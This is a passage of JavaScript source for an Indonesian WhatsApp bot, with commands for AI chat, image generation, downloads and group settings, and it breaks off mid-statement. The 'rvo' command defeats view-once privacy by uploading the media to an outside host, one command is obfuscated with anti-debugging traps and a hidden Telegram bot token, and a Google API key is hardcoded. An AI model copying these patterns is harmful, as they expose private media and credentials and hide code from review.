  Contoh: .font smallcaps Hello
  Hasil: ʜᴇʟʟᴏ

*6. Rounded* (🅗🅔🅛🅛🅞)
  Contoh: .font rounded Hello
  Hasil: 🅗🅔🅛🅛🅞

*7. Squared* (ん乇ﾚﾚの)
  Contoh: .font squared Hello
  Hasil: ん乇ﾚﾚの

Gunakan: .font <gaya> <teks>
Contoh: .font bold HaloDunia
`;

  return reply(fontExamples);
}
break;
case 'rvo': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!isPrem && !TradID) return replyviex(mess.only.owner)
 let mediaMessage = m.quoted || m;
 let mime = (mediaMessage.msg || mediaMessage).mimetype || '';

 if (!mime) return reply('Reply gambar/video/audio yang view-once!');

 let media = await TradzSigma.downloadAndSaveMediaMessage(mediaMessage);

 let results = [];
 try {
 
 const toCloudGood = async (filePath) => {
 try {
 const FormData = require('form-data');
 const fs = require('fs');
 const axios = require('axios');

 const form = new FormData();
 form.append("file", fs.createReadStream(filePath));

 const res = await axios.post("https://cloudgood.web.id/upload.php", form, {
 headers: {
 ...form.getHeaders()
 },
 maxContentLength: Infinity,
 maxBodyLength: Infinity
 });

 return res.data?.url || 'Gagal Bang';
 } catch (err) {
 return `Error CG: ${err.message}`;
 }
 };

 results.push({
 name: 'CloudGood',
 url: await toCloudGood(media)
 });
 } catch (error) {
 console.log('Error Bang:', error);
 }

 if (results.length === 0 || !results[0].url || results[0].url.startsWith('Error')) {
 return reply('Eror Bang.');
 }

 try {
 const axios = require('axios');
 let buffer = (await axios.get(results[0].url, { responseType: 'arraybuffer' })).data;

 if (/video/.test(mime)) {
 await TradzSigma.sendMessage(m.chat, { video: buffer, caption: 'Nih bang.' }, { quoted: m });
 } else if (/image/.test(mime)) {
 await TradzSigma.sendMessage(m.chat, { image: buffer, caption: 'Nih bang.' }, { quoted: m });
 } else if (/audio/.test(mime)) {
 await TradzSigma.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 } else {
 reply('Tipe media tidak didukung.');
 }

 } catch (err) {
 console.error(err);
 reply('Eror Bang');
 }
}
break;
case 'gemini': {
    if (!text) return replyviex("• *Contoh:* .gemini selamat pagi");
    const { uploadFile } = require('cloudku-uploader');
    const { Buffer } = require('buffer');
    const { GoogleGenerativeAI } = require ("@google/generative-ai");
    const genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");
    const geminiProModel = genAI.getGenerativeModel({ model: "gemini-1.5-pro" });
    const geminiFlashModel = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let prompt = text || (m.quoted && m.quoted.text) || "";
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
        let responseText, imageUrl;

        if (mime) {
            // Proses upload gambar ke CloudkuImages
            let fileBuffer = await q.download();
            let ext = mime.split('/')[1] || 'bin';
            let fileName = `upload.${ext}`;

            let uploadResult = await uploadFile(fileBuffer, fileName);
            if (uploadResult.status !== "success") return replyviex("⚠️ Gagal mengunggah gambar!");

            imageUrl = uploadResult.url;

            // Proses AI dengan gambar
            const imageResp = await fetch(imageUrl).then(res => res.arrayBuffer());
            const imageBase64 = Buffer.from(imageResp).toString("base64");

            let imagePart = {
                inlineData: {
                    data: imageBase64,
                    mimeType: mime
                }
            };

            let result = await geminiProModel.generateContent([imagePart, prompt]);
            responseText = result.response.text();
        } else {
            // Proses teks biasa
            let result = await geminiFlashModel.generateContent(prompt);
            responseText = result.response.text();
        }

        if (!responseText) throw new Error("Response tidak valid dari API");

        TradzSigma.sendMessage(m.chat, {
            text: responseText,
            contextInfo: {
                externalAdReply: {
                    title: 'GEMINI-PRO / VISION',
                    thumbnailUrl: imageUrl || 'https://telegra.ph/file/4bae3d5130aabcbe94588.jpg',
                    sourceUrl: 'https://gemini.google.com',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        replyviex("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
}
break;
case 'diffusion-anime': {
	if (!text) return reply(`*• Contoh:* ${prefix + command} siapa nama anda`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return replyviex(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  replyviex('Sedang membuat gambar..')
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await TradzSigma.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      replyviex('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
  } catch (error) {
    console.error(error);
    replyviex('❌ Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}
    break
case 'travel-assistant': {
	if (!text) return reply(`*• Contoh:* ${prefix + command} bagaimana cara mengunjungi taj mahal`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        DinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
    break
case 'guru-ai': {
	if (!text) return replyviex(`*Contoh:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        DinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
}
break
case 'gpt4': {
	if (!text) return replyviex(`*Contoh:* ${prefix + command} Botz Adalah`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return replyviex("`*Error Kak :(*`")
}
}
break

case 'gpt4_2': {
if (!text) return replyviex(`🍃 *Mau Nanya Apa Sama GPT4v2?*`)
DinzIDai(pushname,text)
}
break
    case 'emi-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'claude-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'costume-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'herc-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} how to make girl pregnant`);   
	await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
case 'hercaiv1': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return replyviex(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  replyviex('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await TradzSigma.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      replyviex('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
  } catch (error) {
    console.error(error);
    replyviex('❌ Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}
    break
    case 'hercai-cartoon': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return replyviex(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  replyviex('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await TradzSigma.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      replyviex('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
 } catch(e) {
 return reply("`*Error*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-lexica': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-prodia': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-simurg': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);  
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'telestick': { //credit agan
        	if (m.isGroup) return reply(mess.only.private)
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await TradzSigma[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
case 'mediafire':
			case 'mfire':
			case 'mfdl': {
				if (!text) return replyviex(`*Masukan Query Links!*\n\nContoh:\n${prefix+command} url`)
				await TradzSigma.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let url = text.replace("https://www.mediafire.com/file/", "https://www.mediafire.com/download/")
				try {
					var data = await downloader.mediafireDl(url)
					fileNama = decodeURIComponent(data[0].nama)
					var document = await getBuffer(data[0].link)
					if (data[0].mime.includes('mp4')) {
						TradzSigma.sendMessage(m.chat, {
							document: document,
							fileName: fileNama,
							mimetype: 'video/mp4',
							caption: `*</> MEDIAFIRE DOWN </>*

*Name* : ${data[0].nama}
*Size* : ${data[0].size}
*Jenis* : ${data[0].mime}
`
						}, {
							quoted: m
						})
					} else if (data[0].mime.includes('mp3')) {
						TradzSigma.sendMessage(m.chat, {
							document: document,
							fileName: fileNama,
							mimetype: 'audio/mp3'
						}, {
							quoted: m
						})
					} else {
						TradzSigma.sendMessage(m.chat, {
							document: document,
							fileName: fileNama,
							mimetype: 'application/' + data[0].mime,
							caption: `*</> MEDIAFIRE DOWN </>*

*Name* : ${data[0].nama}
*Size* : ${data[0].size}
*Jenis* : ${data[0].mime}
`,
							contextInfo: {
								mentionedJid: [m.sender],
								externalAdReply: {
									title: `MediaFire🔥`,
									previewType: "PHOTO",
									thumbnailUrl: `https://pomf2.lain.la/f/jgb2lgdx.jpg`,
									sourceUrl: text
								}
							}
						}, {
							quoted: m
						})
					}
				} catch (error) {
					try {
						var {
							result
						} = await fetchJson(`https://api.vreden.my.id/api/mediafiredl?url=${url}`)
						fileNama = decodeURIComponent(result[0].nama)
						var document = await getBuffer(result[0].link)
						if (result[0].mime.includes('mp4')) {
							TradzSigma.sendMessage(m.chat, {
								document: document,
								fileName: fileNama,
								mimetype: 'video/mp4'
							}, {
								quoted: m
							})
						} else if (result[0].mime.includes('mp3')) {
							TradzSigma.sendMessage(m.chat, {
								document: document,
								fileName: fileNama,
								mimetype: 'audio/mp3'
							}, {
								quoted: m
							})
						} else {
							TradzSigma.sendMessage(m.chat, {
								document: document,
								fileName: fileNama,
								mimetype: 'application/' + result[0].mime
							}, {
								quoted: m
							})
						}
					} catch (error) {
						 
					}
				}
			}
			break
    case 'hercai-raava': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
    case 'hercai-shonin': {
	if (!text) return reply(`*Contoh:* ${prefix + command} a girl singing in public`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
    break
case 'realistic': case '3dmodel': {
    	if (!text) return reply(`*Contoh:* ${prefix + command} blue sky`)
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
   	  replyviex(mess.wait)
TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'diffusion':{
if (!text) return reply('Apa yang ingin kamu buat?')
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
    try {
 TradzSigma.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break
case 'indo-ai': {
	if (!text) return reply(`*Contoh:* ${prefix + command} halo`)
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
DinzIDai(pushname,text)
}
break
case 'lepton': case 'leptonai': {
	if (!text) return replyviex(`*Contoh:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);   
await TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
DinzIDai(pushname,text)
 } catch(e) {
 return replyviex("`*Error Kak :(*`")
}
}
break
case '.': {
    const { fromBuffer } = require('file-type');
    if (!text) return reply('apa yang bisa saya bantu?');
    try {
        const prompt = `Kamu adalah yoimiya Whatsapp buatan DinzID Chx,gunakan bahasa yang lembut dsan lucu`
        const formData = new FormData();
        if (/image|video|audio|application\/pdf/.test(mime)) {
            let media = await (m.quoted ? m.quoted.download() : m.download())
            const { ext } = await fromBuffer(media);
            const filename = `./file_${Date.now()}.${ext}`;
            fs.writeFileSync(filename, media);
            formData.append('content', text);
            formData.append('model', 'custom-prompt');
            formData.append('system', prompt)
            formData.append('file', fs.createReadStream(filename));
            const { data } = await axios.post('mind.hydrooo.web.id', formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            fs.unlinkSync(filename);
            await m.reply(data.result);
        } else {
            formData.append('content', text);
            formData.append('model', 'custom-prompt');
            formData.append('system', prompt)
            const { data } = await axios.post('https://luminai.my.id', formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            await reply(data.result);
        }
    } catch (err) {
        console.log(err)
        return reply("waduh le, error :(")
    }
}
break
//=========================================\\======
case 'blackboxai': {
                if (!text) return replyviex('What is your question?')
try {
const data = await fetchJson(`https://endpoint.web.id/ai/openai?key=openai&query=${encodeURIComponent(text)}`);
    if (data && data.result) {
        reply(`${data.result}`);
    } else {
        DinzIDai(pushname, text);
    }
 } catch(e) {
 reply('eror')
}
           }
            break
//=========================================\\======
//=========================================\\======
//=========================================\\======
case 'yoimiyachat': {
  if (!text) return reply(`_Iya kak.._`)
DinzIDai(pushname,text)
}
break 
case 'simi': {
  if (!text) return reply(`apaan manggil manggil..`)
const url = `https://endpoint.web.id/ai/simsimi?key=simi&query=Kamu adalah simi, memiliki sifat nyebelin dan kasar, serta gak banyak basa basi langsung jawab singkat dan langsung ke intinya, serta gunakan kata kata gaul seperti lu dan gua&text=${encodeURIComponent(text)}`;
    const data = await fetchJson(url);
    const response = data.result.response;
    reply(response);
}
break 
//=========================================\\======
case 'mute':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !TradID) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
reply('Successfully Unmute In This Group')
}else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
//=========================================\\======
case 'autoread':
                if (!TradID) return reply(mess.only.owner)
                if (args.length < 1) return replyviex(`Contoh: ${prefix + command} on/off`)
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                }
break
case 'autoaigrup':case 'aigrup': case 'autoaigc':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !TradID) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoread':
                if (!TradID) return reply(mess.only.owner)
                if (args.length < 1) return replyviex(`Contoh: ${prefix + command} on/off`)
                if (q === 'on') {
                    db.settings[botNumber].autoread = true
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autoread = false
                    reply(`Berhasil mengubah autoread menjadi ${q}`)
                }
break
case 'autosimi':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !TradID) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autosimi', m.sender, _cmd)
if (isAutosimi) return reply(`Udah aktif`)
siminya.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autosimi', m.sender, _cmd)
if (!isAutosimi) return reply(`Udah nonaktif`)
let anu = siminya.indexOf(m.chat)
siminya.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(siminya, null, 2))
reply('Successfully Disabling Auto Simi')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'yoimiyachat':{
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins && !TradID) return reply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#yoimiyachat', m.sender, _cmd)
if (TradzIsChat) return reply(`Udah aktif`)
chatDinzID.push(m.chat)
fs.writeFileSync('./database/chatDinzID.json', JSON.stringify(chatDinzID, null, 2))
reply('_Successfully Activate yoimiya Chat_')
} else if (args[0] === "off") {
addCountCmd('#yoimiyachat', m.sender, _cmd)
if (!TradzIsChat) return reply(`Udah nonaktif`)
let anu = chatDinzID.indexOf(m.chat)
chatDinzID.splice(anu, 1)
fs.writeFileSync('./database/chatDinzID.json', JSON.stringify(chatDinzID, null, 2))
reply('_Successfully Disabling yoimiya Chat_')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
